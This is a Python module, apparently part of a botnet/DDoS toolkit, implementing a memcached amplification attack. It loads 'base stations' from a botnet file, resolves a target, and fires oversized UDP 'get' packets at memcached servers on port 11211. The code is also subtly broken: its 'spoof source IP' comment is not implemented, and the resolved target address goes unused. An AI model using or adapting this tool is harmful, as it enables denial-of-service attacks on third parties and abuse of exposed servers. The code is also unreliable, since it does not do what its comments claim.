#!/usr/bin/env python3 
# -*- coding: utf-8 -*-"
"""
This file is part of the CBT (Core Brim Tech) project, https://www.corebrimtech.com

Copyright (c) 2024 | MOMODU KAMARA-KOLLEH

You should have received a copy of the GNU General Public License along
with CBT; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import sys, random, socket, time
try:
    from urlparse import urlparse
except:
    from urllib.parse import urlparse
try:
    from scapy import *
except:
    print("\nError importing: scapy lib.\n")
    sys.exit(2)

# CBT Memcached Amplification (MEMCACHED)
def sIP(memcacheds):
    try:
        memcached = random.choice(memcacheds)
        if memcached.startswith('http://'):
            memcached = memcached.replace('http://','')
        elif memcached.startswith('https://'):
            memcached = memcached.replace('https://','')
        try:
            ip = socket.gethostbyname(memcached)
        except:
            try:
                import dns.resolver
                r = dns.resolver.Resolver()
                r.nameservers = ['8.8.8.8', '8.8.4.4']
                url = urlparse(memcached)
                a = r.query(url.netloc, "A")
                for rd in a:
                    ip = str(rd)
            except:
                ip = None
        return ip
    except:
        return None

def memcachedize(ip, port, rounds):
    f = open('botnet/memcacheds.txt')
    base_stations = f.readlines()
    base_stations = [ base_station.replace('\n','') for base_station in base_stations ]
    f.close()
    n=0
    try:
        for x in range (0,int(rounds)):
            n=n+1
            s_memcached_ip = sIP(base_stations)
            if s_memcached_ip == None:
                print("[Error] [AI] [MEMCACHED] Impossible to retrieve 'base stations' -> [Aborting!]\n")
                break
            # Memcached amplification payload (get command with large key)
            payload = b'\x00\x01\x00\x00\x00\x01\x00\x00get '
            payload += b'A' * 1000  # Large key to maximize amplification
            payload += b'\r\n'
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
                # Spoof source IP to target
                sock.sendto(payload, (s_memcached_ip, 11211))
                print("[Info] [AI] [MEMCACHED] Redirecting 'base station' ["+str(n)+"] ["+str(s_memcached_ip)+"] -> [AMPLIFYING!]")
                time.sleep(0.1)
                sock.close()
            except:
                print("[Error] [AI] [MEMCACHED] Failed to redirect 'base station' ["+str(n)+"] ["+str(s_memcached_ip)+"]")
    except:
        print("[Error] [AI] [MEMCACHED] Failing to engage... -> Is still target online? -> [Checking!]")

class MEMCACHED(object):
    def attacking(self, target, rounds):
        print("[Info] [AI] Memcached Amplification (MEMCACHED) is ready to fire: [" , rounds, "amplification pulses ]")
        if target.startswith('http://'):
            target = target.replace('http://','')
            port = 80
        elif target.startswith('https://'):
            target = target.replace('https://','')
            port = 443
        try:
            ip = socket.gethostbyname(target)
        except:
            try:
                import dns.resolver
                r = dns.resolver.Resolver()
                r.nameservers = ['8.8.8.8', '8.8.4.4']
                url = urlparse(target)
                a = r.query(url.netloc, "A")
                for rd in a:
                    ip = str(rd)
            except:
                ip = target
        if ip == "127.0.0.1" or ip == "localhost":
            print("[Info] [AI] [MEMCACHED] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
            return
        memcachedize(ip, port, rounds)
